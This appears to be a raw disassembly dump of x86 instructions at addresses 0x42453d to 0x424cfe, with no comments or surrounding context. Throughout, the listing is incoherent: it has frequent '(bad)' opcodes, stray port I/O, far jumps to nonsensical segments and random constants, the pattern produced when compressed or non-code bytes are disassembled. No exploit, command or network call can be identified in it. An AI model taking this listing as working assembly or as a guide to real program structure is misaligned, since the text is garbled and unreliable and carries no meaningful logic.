  42453d:	inc    eax
  42453e:	dec    BYTE PTR [eax-0x7b]
  424541:	sbb    ecx,DWORD PTR [esi]
  424543:	mov    bl,0xc9
  424545:	pop    edx
  424546:	and    DWORD PTR [ebx+0x3bdb37ff],ebx
  42454c:	jp     0x424569
  42454e:	or     eax,0xb42f8d89
  424553:	add    ch,BYTE PTR [edx-0x3212bbdc]
  424559:	cmp    edx,DWORD PTR [edx+eax*1]
  42455c:	jp     0x424585
  42455e:	test   al,0xf0
  424560:	sbb    eax,0xe7bd8ba2
  424565:	or     eax,0xa9dff2a5
  42456a:	or     al,BYTE PTR [ebx]
  42456c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42456d:	or     dl,BYTE PTR [esi]
  42456f:	pop    edi
  424570:	add    DWORD PTR [edx-0x4a48eea],ebp
  424576:	aad    0xa5
  424578:	imul   esp,DWORD PTR ds:0x849d9337,0x66c6a736
  424582:	add    DWORD PTR [ecx+0x789e1f65],esp
  424588:	les    ecx,FWORD PTR [ebx-0x2be80304]
  42458e:	cmp    bl,BYTE PTR [ecx-0x6ffc3924]
  424594:	sub    edi,edi
  424596:	mov    ebx,0xed615b0a
  42459b:	push   edi
  42459c:	ds fwait
  42459e:	lahf   
  42459f:	pusha  
  4245a0:	pop    edi
  4245a1:	std    
  4245a2:	adc    eax,0x8f79dc67
  4245a7:	mov    edi,fs
  4245a9:	stos   BYTE PTR es:[edi],al
  4245aa:	pop    ds
  4245ab:	jmp    0x720f5038
  4245b0:	xor    eax,0xee279734
  4245b5:	jbe    0x424607
  4245b7:	sahf   
  4245b8:	(bad)  
  4245ba:	pop    esi
  4245bb:	fidiv  WORD PTR [ebx-0x7e]
  4245be:	into   
  4245bf:	xchg   ebx,esi
  4245c1:	ss call 0x82e2f72a
  4245c7:	into   
  4245c8:	jno    0x424647
  4245ca:	push   ecx
  4245cb:	mov    al,0xeb
  4245cd:	cmp    eax,0x4f1d49d1
  4245d2:	loope  0x424628
  4245d4:	retf   
  4245d5:	or     eax,0x82a1e4bb
  4245da:	call   0x188f6e6f
  4245df:	std    
  4245e0:	in     eax,0x2d
  4245e2:	jp     0x424640
  4245e4:	push   eax
  4245e5:	aas    
  4245e6:	pop    eax
  4245e7:	cs cwde 
  4245e9:	adc    al,0xe1
  4245eb:	push   edi
  4245ec:	int3   
  4245ed:	dec    edx
  4245ee:	add    BYTE PTR [edi],dl
  4245f0:	outs   dx,BYTE PTR ds:[esi]
  4245f1:	pop    edx
  4245f2:	stos   DWORD PTR es:[edi],eax
  4245f3:	daa    
  4245f4:	out    dx,al
  4245f5:	mov    ch,0x25
  4245f7:	loop   0x42457c
  4245f9:	sbb    BYTE PTR [edx],0x58
  4245fc:	or     DWORD PTR [esi],esp
  4245fe:	xchg   ah,cl
  424600:	xchg   cl,ch
  424602:	fld    st(0)
  424604:	test   BYTE PTR [ebx-0x28],ah
  424607:	scas   al,BYTE PTR es:[edi]
  424608:	or     edi,DWORD PTR [eax-0x3b]
  42460b:	push   0x4
  42460d:	push   es
  42460e:	xchg   edi,eax
  42460f:	(bad)  
  424611:	lds    esp,FWORD PTR [edx+esi*4+0x23]
  424615:	(bad)  
  424616:	adc    edi,DWORD PTR [ebp-0x4f]
  424619:	popa   
  42461a:	add    BYTE PTR [esi-0xa4312df],al
  424620:	pop    es
  424621:	call   0xd23c:0x685b8c4b
  424628:	ins    BYTE PTR es:[edi],dx
  424629:	jnp    0x4245ed
  42462b:	popa   
  42462c:	mov    eax,0x704a007b
  424631:	fdivr  DWORD PTR [edx+edi*8-0x4]
  424635:	out    dx,al
  424636:	jbe    0x4245dd
  424638:	mov    eax,0xd7896213
  42463d:	outs   dx,DWORD PTR ds:[esi]
  42463e:	dec    esp
  42463f:	mov    bh,0xbf
  424641:	add    DWORD PTR [eax],eax
  424643:	out    0x1,eax
  424645:	add    BYTE PTR [eax],al
  424647:	xchg   ebx,eax
  424648:	and    BYTE PTR [eax+0x728c007a],ch
  42464e:	jg     0x424674
  424650:	add    eax,esi
  424652:	cmp    esp,esi
  424654:	cwde   
  424655:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424656:	call   0x1846:0x6bf9a90f
  42465d:	inc    ebx
  42465e:	addr16 fcmovu st,st(1)
  424661:	jbe    0x424690
  424663:	push   0x9c2425ac
  424668:	rcr    BYTE PTR [edi],1
  42466a:	sub    eax,0xfe4feb10
  42466f:	and    esi,DWORD PTR [eax+0x46644ed4]
  424675:	div    BYTE PTR [ebx+0x387f4d67]
  42467b:	shl    edi,cl
  42467d:	rcr    DWORD PTR [ebx],1
  42467f:	lock or edx,DWORD PTR [esi+0x4]
  424683:	(bad)  
  424684:	test   al,0xcb
  424686:	je     0x424643
  424688:	fs mov cl,0x47
  42468b:	in     eax,0xd9
  42468d:	jg     0x424646
  42468f:	es jae 0x42466d
  424692:	mov    ah,0x40
  424694:	imul   eax,edi,0x7c746710
  42469a:	ror    dl,0xc6
  42469d:	jmp    0x7bdd:0x6ff4ee7d
  4246a4:	pusha  
  4246a5:	in     eax,dx
  4246a6:	inc    eax
  4246a7:	inc    eax
  4246a8:	les    edx,FWORD PTR [esi-0x687930b8]
  4246ae:	cmp    BYTE PTR [edi],bl
  4246b0:	sti    
  4246b1:	punpckldq mm1,mm6
  4246b4:	neg    BYTE PTR [eax+0x4a]
  4246b7:	sub    ecx,DWORD PTR [eax]
  4246b9:	push   esp
  4246ba:	adc    ch,BYTE PTR gs:0xfafe6b31
  4246c1:	push   0x8b60d34b
  4246c6:	dec    edx
  4246c7:	mov    cl,ah
  4246c9:	div    DWORD PTR [edi+0x4a]
  4246cc:	sub    DWORD PTR [edx],0xffffffd3
  4246cf:	or     DWORD PTR [edx],edx
  4246d1:	rcr    DWORD PTR [ebp+0x12],1
  4246d4:	xor    DWORD PTR [ecx+esi*2+0x2f],edx
  4246d8:	mov    eax,ds:0x41bd46ee
  4246dd:	dec    edx
  4246de:	sub    BYTE PTR [ecx-0x40404bfb],al
  4246e4:	inc    edi
  4246e5:	jbe    0x42468b
  4246e7:	sub    al,0x5d
  4246e9:	xchg   ebx,eax
  4246ea:	sbb    eax,0xa868bea7
  4246ef:	cmp    al,0x4b
  4246f1:	int    0xb0
  4246f3:	inc    ebp
  4246f4:	push   cs
  4246f5:	sub    eax,0x331f8bce
  4246fa:	call   DWORD PTR [edx]
  4246fc:	adc    ecx,DWORD PTR [edx]
  4246fe:	dec    esp
  4246ff:	xchg   esp,eax
  424700:	(bad)  
  424702:	imul   ecx,DWORD PTR es:[ebx-0x45],0x13
  424707:	cmp    BYTE PTR [eax+0x42f7a23e],ah
  42470d:	mov    cl,0x39
  42470f:	xor    dh,BYTE PTR [eax]
  424711:	mov    ds:0x470f85e3,eax
  424716:	sub    BYTE PTR [esi+0x59],ch
  424719:	jo     0x424751
  42471b:	idiv   BYTE PTR [edi+0x14509ad8]
  424721:	test   eax,0x2b75cf79
  424726:	mov    ch,0x6
  424728:	out    0x77,al
  42472a:	push   0xffffffb2
  42472c:	pusha  
  42472d:	imul   ecx,DWORD PTR [eax],0xeb1bdde
  424733:	mov    ds:0x176fbeee,eax
  424738:	or     ch,BYTE PTR [ebx-0x5de5b2cc]
  42473e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42473f:	addr16 push ss
  424741:	and    BYTE PTR [edx+0x4f05bd0e],cl
  424747:	enter  0x8311,0xf4
  42474b:	mov    cl,0x8a
  42474d:	mov    dh,0x5f
  42474f:	push   0x41b2a663
  424754:	test   BYTE PTR [edi-0x6f],bh
  424757:	mov    esp,0x27addc01
  42475c:	push   ss
  42475d:	mov    ds:0xd71a8c4f,al
  424762:	mov    ?,esp
  424764:	mov    edi,0x77dc7a93
  424769:	call   0x66d1ffff
  42476e:	push   esi
  42476f:	add    edx,0x59de6401
  424775:	cmp    dh,BYTE PTR [ecx+0x50]
  424778:	and    DWORD PTR [edx],eax
  42477a:	mov    eax,DWORD PTR [eax+0x517b32ab]
  424780:	inc    esp
  424781:	xor    ah,BYTE PTR [ebp-0x25]
  424784:	and    dl,0x79
  424787:	cli    
  424788:	jmp    0xf13cd1cb
  42478d:	push   edx
  42478e:	stos   BYTE PTR es:[edi],al
  42478f:	out    0x88,eax
  424791:	leave  
  424792:	loop   0x424796
  424794:	in     eax,0x2f
  424796:	mov    edx,0xed98f3f5
  42479b:	cwde   
  42479c:	push   ss
  42479d:	push   cs
  42479e:	sahf   
  42479f:	dec    eax
  4247a0:	pop    ebp
  4247a1:	sub    al,0x1c
  4247a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4247a4:	mov    edx,ebx
  4247a6:	int3   
  4247a7:	mov    al,0x86
  4247a9:	cdq    
  4247aa:	pop    edi
  4247ab:	jle    0x4247bd
  4247ad:	jbe    0x4247fa
  4247af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4247b0:	outs   dx,DWORD PTR ds:[esi]
  4247b1:	jmp    0x216d:0x1a3e60d9
  4247b8:	xchg   edx,eax
  4247b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247ba:	aam    0x3c
  4247bc:	aam    0x56
  4247be:	sbb    dl,ah
  4247c0:	jl     0x4247f7
  4247c2:	jl     0x4247d0
  4247c4:	pop    edx
  4247c5:	pop    es
  4247c6:	mov    edi,0x9a6f488a
  4247cb:	fstp   QWORD PTR [edx]
  4247cd:	call   0xe0c8:0x736a893b
  4247d4:	rcr    BYTE PTR [edi+eax*8],0xde
  4247d8:	mov    bh,0x91
  4247da:	js     0x4247c7
  4247dc:	lods   al,BYTE PTR ds:[esi]
  4247dd:	adc    BYTE PTR [edx+0x50],bl
  4247e0:	jae    0x4247b1
  4247e2:	adc    al,0x71
  4247e4:	repz gs xchg ebp,eax
  4247e7:	test   BYTE PTR [esi],bl
  4247e9:	xlat   BYTE PTR ds:[ebx]
  4247ea:	xchg   ecx,eax
  4247eb:	xchg   ebp,eax
  4247ec:	int    0xf3
  4247ee:	mov    al,ds:0xaad6871d
  4247f3:	jg     0x4247d6
  4247f5:	test   DWORD PTR [edi-0x6d35053f],eax
  4247fb:	iret   
  4247fc:	aad    0x26
  4247fe:	test   BYTE PTR [edx-0x6f],dh
  424801:	test   BYTE PTR [edx],bh
  424803:	push   ecx
  424804:	shld   DWORD PTR [edx+0xd],edi,cl
  424808:	popf   
  424809:	out    dx,al
  42480a:	pop    ss
  42480b:	mov    al,ds:0x9d950a8a
  424810:	fistp  QWORD PTR [edi+0x34235918]
  424816:	out    0x54,al
  424818:	aaa    
  424819:	jmp    0xbbfd:0xdae5c7bf
  424820:	add    eax,0x9ea76406
  424825:	mov    al,0x78
  424827:	das    
  424828:	int    0xcc
  42482a:	add    ebx,edx
  42482c:	dec    eax
  42482d:	or     al,BYTE PTR [eax]
  42482f:	(bad)  
  424830:	fld    QWORD PTR [ebx-0x70212c74]
  424836:	fld    QWORD PTR [edx]
  424838:	(bad)  
  424839:	mov    dh,0x7
  42483b:	push   ss
  42483c:	jnp    0x424841
  42483e:	sbb    DWORD PTR [esi-0x18fffe3f],ebx
  424844:	add    DWORD PTR [eax],eax
  424846:	add    BYTE PTR [eax],ah
  424848:	pop    ss
  424849:	or     al,0x2
  42484b:	aas    
  42484c:	mov    bl,cl
  42484e:	in     al,0x25
  424850:	ret    0x6ed2
  424853:	mov    DWORD PTR [eax-0x2c],0x9bf982c
  42485a:	lods   eax,DWORD PTR ds:[esi]
  42485b:	std    
  42485c:	pop    edx
  42485d:	js     0x42483f
  42485f:	dec    edx
  424860:	sti    
  424861:	sub    al,0x16
  424863:	or     DWORD PTR ds:0x25a3f23c,ecx
  424869:	add    al,0x2f
  42486b:	mov    cl,0x66
  42486d:	stos   DWORD PTR es:[edi],eax
  42486e:	adc    eax,0x2b5c2f4f
  424873:	js     0x424882
  424875:	jmp    0x424898
  424877:	xor    ecx,DWORD PTR [edi+0x3add561c]
  42487d:	pop    edi
  42487e:	fisttp WORD PTR gs:[edx+eiz*1+0x4a5a8e25]
  424886:	retf   
  424887:	adc    bl,bh
  424889:	mov    eax,ds:0xc95edc8
  42488e:	ins    BYTE PTR es:[edi],dx
  42488f:	popa   
  424890:	inc    ebx
  424891:	fcomp  DWORD PTR [edx-0x59]
  424894:	dec    esp
  424895:	adc    ch,dh
  424897:	fst    DWORD PTR [eax-0x33c81998]
  42489d:	cwde   
  42489e:	outs   dx,BYTE PTR ds:[esi]
  42489f:	fwait
  4248a0:	xchg   BYTE PTR [ecx],dh
  4248a2:	lahf   
  4248a3:	daa    
  4248a4:	retf   
  4248a5:	adc    al,0xd5
  4248a7:	int    0x5f
  4248a9:	shl    BYTE PTR [esi-0x574221a4],0xc0
  4248b0:	mov    eax,ds:0x50144a99
  4248b5:	jo     0x424868
  4248b7:	mov    eax,ds:0x2d368505
  4248bd:	rcl    DWORD PTR [esi+eiz*1-0x6428ea94],cl
  4248c4:	loop   0x42485e
  4248c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4248c7:	push   0xffffffc4
  4248c9:	add    eax,0x97a7cab3
  4248ce:	mov    edx,0x35812d40
  4248d3:	lea    eax,[ecx+0x4d]
  4248d6:	daa    
  4248d7:	dec    BYTE PTR ds:0xe0a22c45
  4248dd:	sbb    dl,ch
  4248df:	jbe    0x4248b5
  4248e1:	fadd   DWORD PTR [esi+0xc]
  4248e4:	mov    esi,0x226d14d9
  4248e9:	aam    0xa4
  4248eb:	push   cs
  4248ec:	aad    0xd
  4248ee:	and    eax,0x874440a4
  4248f3:	mov    eax,0x81d30bff
  4248f8:	lds    edx,FWORD PTR [ecx+0x5bbcb9fb]
  4248fe:	out    0x38,eax
  424900:	xchg   esp,eax
  424901:	shr    DWORD PTR [eax],0xcd
  424904:	sti    
  424905:	mov    ah,0xfd
  424907:	retf   
  424908:	int3   
  424909:	jo     0x424935
  42490b:	push   esp
  42490c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42490d:	repz jle 0x4248af
  424910:	sub    bl,BYTE PTR fs:[edx-0x7b]
  424914:	or     cl,ch
  424916:	aad    0x5c
  424918:	and    al,0xf4
  42491a:	cmp    eax,0xc68f52b8
  42491f:	not    al
  424921:	ins    BYTE PTR es:[edi],dx
  424922:	xlat   BYTE PTR ds:[ebx]
  424923:	xor    ecx,0x73
  424926:	jns    0x42491a
  424928:	jnp    0x4248f8
  42492a:	jmp    0x47389395
  42492f:	(bad)  
  424930:	aas    
  424931:	lods   eax,DWORD PTR ds:[esi]
  424932:	lahf   
  424933:	imul   edx,DWORD PTR [edi+ebx*8],0xe380b68b
  42493a:	lea    ecx,[ebx+0x7822787a]
  424940:	mov    edi,0xaf8bdf3c
  424945:	adc    DWORD PTR [ebp-0x5faa6d7a],esi
  42494b:	dec    edx
  42494c:	rcr    BYTE PTR [edx-0x77],1
  42494f:	and    al,ah
  424951:	(bad)  
  424952:	ja     0x424943
  424954:	jg     0x424976
  424956:	sahf   
  424957:	sub    DWORD PTR [ecx-0x7abcbab9],edx
  42495d:	inc    ecx
  42495e:	repnz add ebp,edi
  424961:	ja     0x424957
  424963:	and    dl,BYTE PTR [eax]
  424965:	cmp    eax,0x129d060d
  42496a:	leave  
  42496b:	mov    dh,BYTE PTR [ebx]
  42496d:	in     eax,dx
  42496e:	fstp   DWORD PTR [ebp+0x1cc140cb]
  424974:	ins    DWORD PTR es:[edi],dx
  424975:	push   esp
  424976:	mov    bl,0xda
  424978:	test   ch,al
  42497a:	add    edi,DWORD PTR [esi-0x49]
  42497d:	(bad)  
  42497f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424980:	mov    ds:0x3f3c4577,al
  424985:	adc    bl,BYTE PTR [ecx-0x1f]
  424988:	fsubr  QWORD PTR [ebx-0x15]
  42498b:	mov    edi,DWORD PTR [edi]
  42498d:	test   BYTE PTR [ebp+0x6c],ah
  424990:	xchg   esi,eax
  424991:	push   eax
  424992:	ss xchg esp,eax
  424994:	sbb    eax,0xd7f081b5
  424999:	mov    eax,ebp
  42499b:	(bad)  
  42499d:	push   ebp
  42499e:	dec    esp
  42499f:	fist   WORD PTR [ebx]
  4249a1:	or     eax,ebx
  4249a3:	shr    BYTE PTR [edx-0x3e5b6dfd],1
  4249a9:	test   al,0x5a
  4249ab:	sub    DWORD PTR [eax],edi
  4249ad:	inc    edi
  4249ae:	lock jp 0x4249de
  4249b1:	sub    BYTE PTR [ebp+0x4c576f63],dl
  4249b7:	sub    cl,BYTE PTR [esi]
  4249b9:	cmp    edi,eax
  4249bb:	gs in  al,dx
  4249bd:	cmp    BYTE PTR [edx-0x39],0xa1
  4249c1:	mov    dl,0x17
  4249c3:	fmul   QWORD PTR [ebx-0x13]
  4249c6:	add    edi,edx
  4249c8:	mov    ds:0x395211b3,eax
  4249cd:	mul    edi
  4249cf:	(bad)  
  4249d0:	cmc    
  4249d1:	ficomp WORD PTR [esi-0x59]
  4249d4:	gs das 
  4249d6:	rcl    dl,0xe2
  4249d9:	jmp    FWORD PTR [edx+eax*1-0x9e15fd]
  4249e0:	jne    0x4249ef
  4249e2:	lea    esi,[ecx]
  4249e4:	dec    ebx
  4249e5:	mov    eax,0x8f3f101c
  4249ea:	lods   al,BYTE PTR ds:[esi]
  4249eb:	jge    0x424988
  4249ed:	pop    es
  4249ee:	push   ebp
  4249ef:	jb     0x4249ff
  4249f1:	jb     0x424a71
  4249f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4249f4:	or     al,0xb5
  4249f6:	inc    esp
  4249f7:	js     0x4249ef
  4249f9:	cmp    BYTE PTR [esi],bh
  4249fb:	sub    DWORD PTR [ebp+0x48],edx
  4249fe:	lods   eax,DWORD PTR ds:[esi]
  4249ff:	and    al,0xbc
  424a01:	xlat   BYTE PTR ds:[ebx]
  424a02:	es jge 0x424a6d
  424a05:	out    dx,eax
  424a06:	xlat   BYTE PTR ds:[ebx]
  424a07:	sbb    al,0x76
  424a09:	mov    bh,0x1f
  424a0b:	push   ss
  424a0c:	retf   
  424a0d:	pop    ss
  424a0e:	inc    ecx
  424a0f:	adc    edi,ecx
  424a11:	jb     0x4249dd
  424a13:	ds cmp ecx,ecx
  424a16:	je     0x424a09
  424a18:	sub    DWORD PTR [ebp-0x78234f68],ecx
  424a1e:	inc    ebp
  424a1f:	and    BYTE PTR [esi-0x2f],dh
  424a22:	sub    esi,0xffffffb8
  424a25:	in     al,dx
  424a26:	xchg   ebp,eax
  424a27:	in     al,0xdc
  424a29:	mov    al,0x8
  424a2b:	xchg   ecx,eax
  424a2c:	pop    esi
  424a2d:	sahf   
  424a2e:	add    BYTE PTR [esi],bh
  424a30:	inc    esi
  424a31:	dec    edx
  424a32:	mov    ebp,0xc7ffbd7a
  424a37:	xchg   ecx,eax
  424a38:	adc    eax,0x1bb28f33
  424a3d:	(bad)  [edi]
  424a3f:	test   ebx,eax
  424a41:	add    DWORD PTR [eax],eax
  424a43:	out    0x1,eax
  424a45:	add    BYTE PTR [eax],al
  424a47:	mov    esi,es
  424a49:	repz mov al,0x59
  424a4c:	int    0x41
  424a4e:	lods   al,BYTE PTR ds:[esi]
  424a4f:	cdq    
  424a50:	cld    
  424a51:	xor    DWORD PTR ds:0xa49ac124,edi
  424a57:	jno    0x424a97
  424a59:	(bad)  
  424a5a:	mov    esi,0x7ddcd23d
  424a5f:	push   0x79cba85
  424a64:	add    al,0x94
  424a66:	out    dx,eax
  424a67:	loopne 0x424a64
  424a69:	push   esp
  424a6a:	jl     0x424a44
  424a6c:	fidivr WORD PTR [edx]
  424a6e:	test   BYTE PTR [ecx+0x699b6f61],0x10
  424a75:	mov    ?,WORD PTR [edx-0x7bc9bd86]
  424a7b:	xor    edx,edx
  424a7d:	xlat   BYTE PTR ds:[ebx]
  424a7e:	pop    ebp
  424a7f:	data16 cmp al,0x9e
  424a82:	pushf  
  424a83:	in     al,0x82
  424a85:	(bad)  
  424a86:	pop    edx
  424a87:	adc    al,0x29
  424a89:	xchg   esi,eax
  424a8a:	mov    BYTE PTR [edx-0x4e],cl
  424a8d:	data16 aas 
  424a8f:	sbb    bl,dl
  424a91:	jno    0xd4e5b393
  424a97:	in     eax,0xeb
  424a99:	sbb    al,0x34
  424a9b:	dec    edi
  424a9c:	std    
  424a9d:	xchg   esp,eax
  424a9e:	inc    edi
  424a9f:	out    0xec,eax
  424aa1:	retf   
  424aa2:	xchg   BYTE PTR ds:0xc069a9c6,cl
  424aa8:	aam    0x60
  424aaa:	jl     0x424acb
  424aac:	(bad)  
  424aad:	pop    ebp
  424aae:	pop    esp
  424aaf:	icebp  
  424ab0:	and    BYTE PTR [eax+ebx*1],bh
  424ab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ab4:	test   eax,0x9062add
  424ab9:	gs in  eax,dx
  424abb:	jmp    0x72c8:0xe5e50921
  424ac2:	out    0x7d,eax
  424ac4:	call   0x577e:0xa4c89df1
  424acb:	mov    BYTE PTR [ecx+eiz*8],dl
  424ace:	sti    
  424acf:	cmp    dl,BYTE PTR [ebx+0x26870b3]
  424ad5:	inc    eax
  424ad6:	test   ebp,ebp
  424ad8:	cmp    eax,0xafd054d3
  424add:	test   eax,0xcc48bbd2
  424ae2:	and    BYTE PTR [esi+edx*4],0x14
  424ae6:	mov    ebx,0xc25faba2
  424aeb:	xchg   ebx,eax
  424aec:	add    DWORD PTR [edi+0x73],edx
  424aef:	dec    edx
  424af0:	cmp    eax,0xd6d8caef
  424af5:	jp     0x424b67
  424af7:	adc    ecx,DWORD PTR [esi-0x314915ec]
  424afd:	cmp    ch,ch
  424aff:	pop    ss
  424b00:	push   edx
  424b01:	ficom  DWORD PTR [edi-0x62]
  424b04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424b05:	mov    ch,0xfe
  424b07:	dec    ebp
  424b08:	push   ss
  424b09:	sub    al,0xc2
  424b0b:	xchg   ecx,eax
  424b0c:	sub    esi,DWORD PTR [ebx+0xe]
  424b0f:	les    edi,FWORD PTR [ecx]
  424b11:	ins    BYTE PTR es:[edi],dx
  424b12:	cmp    ebx,DWORD PTR [ebp-0x5e]
  424b15:	dec    esi
  424b16:	dec    ebx
  424b17:	xchg   ebx,eax
  424b18:	js     0x424ae7
  424b1a:	bound  edi,QWORD PTR [ecx-0x1c]
  424b1d:	out    dx,eax
  424b1e:	outs   dx,BYTE PTR ds:[esi]
  424b1f:	jo     0x424b0a
  424b21:	inc    esp
  424b22:	es jo  0x424ae5
  424b25:	jns    0x424b91
  424b27:	aas    
  424b28:	xlat   BYTE PTR ds:[ebx]
  424b29:	inc    esi
  424b2a:	in     al,0xfc
  424b2c:	rol    dl,cl
  424b2e:	popa   
  424b2f:	mov    ah,0x15
  424b31:	and    cl,BYTE PTR [esi+0x76b35a79]
  424b37:	repz clc 
  424b39:	sbb    ah,BYTE PTR ds:0x20882517
  424b3f:	mov    dl,BYTE PTR [edi]
  424b41:	cmc    
  424b42:	and    DWORD PTR [esi+0x4be2392f],edx
  424b48:	pop    eax
  424b49:	mov    eax,0xb4c3457a
  424b4e:	jge    0x424bb1
  424b50:	dec    edx
  424b51:	inc    eax
  424b52:	inc    esp
  424b53:	loopne 0x424b86
  424b55:	mov    bl,0xbe
  424b57:	mov    ds:0x7720c44c,eax
  424b5c:	jge    0x424bc0
  424b5e:	pop    es
  424b5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424b60:	lock shl DWORD PTR [ebp+0x17ec8cbd],1
  424b67:	jns    0x424b4e
  424b69:	adc    al,0x3f
  424b6b:	mov    bl,0xfd
  424b6d:	xchg   esi,eax
  424b6e:	jle    0x424b6a
  424b70:	mov    es,esi
  424b72:	loope  0x424b5f
  424b74:	mov    edi,0x20ffa083
  424b79:	lds    ecx,FWORD PTR [ebx-0x60]
  424b7c:	stc    
  424b7d:	mov    ebx,0x5c7c6e95
  424b82:	cmp    al,0xa3
  424b84:	sub    DWORD PTR [ecx],edi
  424b86:	pop    ss
  424b87:	and    bl,0xcd
  424b8a:	cmp    al,0x21
  424b8c:	stos   DWORD PTR es:[edi],eax
  424b8d:	daa    
  424b8e:	xchg   DWORD PTR [edi-0x2f140a5a],edx
  424b94:	shl    DWORD PTR [ebx+0x5d],1
  424b97:	(bad)  
  424b98:	std    
  424b99:	jo     0x424b6c
  424b9b:	inc    esp
  424b9c:	mov    al,0x24
  424b9e:	adc    eax,0xea409b64
  424ba3:	mov    cl,0x24
  424ba5:	in     eax,0x20
  424ba7:	adc    BYTE PTR [ebx-0x53],dh
  424baa:	sbb    eax,ebp
  424bac:	ds inc ebx
  424bae:	(bad)  
  424bb0:	js     0x424ba6
  424bb2:	ss iret 
  424bb4:	add    ch,BYTE PTR [ebx-0x52f1bf03]
  424bba:	lahf   
  424bbb:	mov    bl,0x66
  424bbd:	jecxz  0x424bd8
  424bbf:	sbb    BYTE PTR [edi+edi*1],al
  424bc2:	mov    ebp,0x82ef0473
  424bc7:	inc    ebp
  424bc8:	xor    al,0x17
  424bca:	xlat   BYTE PTR ds:[ebx]
  424bcb:	in     al,dx
  424bcc:	add    BYTE PTR [ebx+0x20],dh
  424bcf:	rcl    DWORD PTR [ebp-0x64],0x1b
  424bd3:	jno    0x424c18
  424bd5:	imul   edx,DWORD PTR [ebx],0xf6166c1d
  424bdb:	push   edi
  424bdc:	iret   
  424bdd:	dec    edi
  424bde:	pushf  
  424bdf:	jbe    0x424c25
  424be1:	je     0x424c5f
  424be3:	in     eax,0x33
  424be5:	sahf   
  424be6:	adc    eax,edi
  424be8:	dec    eax
  424be9:	loop   0x424b9a
  424beb:	jo     0x424bc5
  424bed:	pushf  
  424bee:	lods   eax,DWORD PTR ds:[esi]
  424bef:	icebp  
  424bf0:	jbe    0x424c46
  424bf2:	adc    eax,0x8c12aea7
  424bf7:	xchg   edi,eax
  424bf8:	imul   eax,DWORD PTR [esi+ebx*4],0xc648bcac
  424bff:	sub    al,0xd8
  424c01:	jg     0x424bf9
  424c03:	mov    ds:0xc8121b73,al
  424c08:	aam    0x90
  424c0a:	push   ds
  424c0b:	js     0x424ba2
  424c0d:	icebp  
  424c0e:	push   ds
  424c0f:	push   ecx
  424c10:	push   edi
  424c11:	sbb    edi,DWORD PTR [ecx+0x4e9737ba]
  424c17:	loopne 0x424c10
  424c19:	mov    al,0x4f
  424c1b:	pop    ecx
  424c1c:	jmp    0x4328dce3
  424c21:	or     DWORD PTR [esp+ecx*2-0x36],edi
  424c25:	mov    bl,0xa1
  424c27:	jb     0x424c86
  424c29:	mov    edi,0xafe66754
  424c2e:	add    BYTE PTR [edx+eax*8],cl
  424c31:	xlat   BYTE PTR ds:[ebx]
  424c32:	and    bl,bh
  424c34:	aaa    
  424c35:	std    
  424c36:	out    dx,al
  424c37:	test   ecx,ebx
  424c39:	inc    edx
  424c3a:	ins    DWORD PTR es:[edi],dx
  424c3b:	inc    esi
  424c3c:	sar    BYTE PTR [ebx+0x7],0x6c
  424c40:	lds    eax,FWORD PTR [ecx]
  424c42:	add    bh,ah
  424c44:	add    DWORD PTR [eax],eax
  424c46:	add    BYTE PTR [ecx+0x434638c0],bh
  424c4c:	mov    dl,0xd8
  424c4e:	arpl   WORD PTR [edi+0x38],si
  424c51:	and    DWORD PTR [ebp+0x51],esi
  424c54:	imul   ebx,DWORD PTR [eax+0x223cb851],0xffffffe2
  424c5b:	adc    eax,0x4eb92708
  424c60:	dec    ecx
  424c61:	nop
  424c62:	test   eax,0xeef10a32
  424c67:	mov    ds:0x9a7f0964,al
  424c6c:	cmp    esi,DWORD PTR [esi]
  424c6e:	je     0x424c71
  424c70:	and    al,0xeb
  424c72:	sub    al,0xb3
  424c74:	dec    ebx
  424c75:	mov    eax,0xd97de266
  424c7a:	int    0x54
  424c7c:	test   eax,0x1de968a9
  424c81:	push   esi
  424c82:	popf   
  424c83:	push   esp
  424c84:	out    0xac,al
  424c86:	or     ch,BYTE PTR [ecx+0x2e]
  424c89:	xor    al,0xd0
  424c8b:	xchg   ebp,eax
  424c8c:	adc    eax,0x4500bc5
  424c91:	in     eax,dx
  424c92:	mov    esp,0x88d09427
  424c97:	pop    ss
  424c98:	div    ecx
  424c9a:	pop    ds
  424c9b:	and    dl,ch
  424c9d:	pop    esp
  424c9e:	mov    cl,0xf5
  424ca0:	xor    ah,BYTE PTR [ecx+eiz*4]
  424ca3:	and    cl,BYTE PTR [edi+eiz*1-0xbcc2914]
  424caa:	in     al,0x1e
  424cac:	pop    ss
  424cad:	or     bl,BYTE PTR [ecx+0x2f93e257]
  424cb3:	ret    0x95f3
  424cb6:	push   edx
  424cb7:	push   esp
  424cb8:	sub    bl,BYTE PTR [esi]
  424cba:	adc    eax,0xba2ddc87
  424cbf:	fsubrp st(6),st
  424cc1:	adc    dl,ah
  424cc3:	leave  
  424cc4:	pop    esp
  424cc5:	sub    BYTE PTR gs:[ecx-0x146363e2],cl
  424ccc:	and    edx,esi
  424cce:	inc    ecx
  424ccf:	imul   eax,DWORD PTR [edi],0x5f5d3ff8
  424cd5:	loop   0x424d06
  424cd7:	cmp    eax,0x89d33219
  424cdc:	or     ah,BYTE PTR [ebp+ebp*8-0x23]
  424ce0:	arpl   cx,bx
  424ce2:	push   ds
  424ce3:	pop    ds
  424ce4:	out    dx,eax
  424ce5:	cwde   
  424ce6:	or     esi,ecx
  424ce8:	xchg   ecx,eax
  424ce9:	pushf  
  424cea:	adc    dl,ah
  424cec:	bound  esi,QWORD PTR [esi-0x47]
  424cef:	adc    DWORD PTR [ecx-0x4e],ecx
  424cf2:	dec    edi
  424cf3:	mov    ebp,0xf47e72c
  424cf8:	aad    0xff
  424cfa:	mov    dh,0x3f
  424cfc:	sub    al,ah
  424cfe:	pusha  
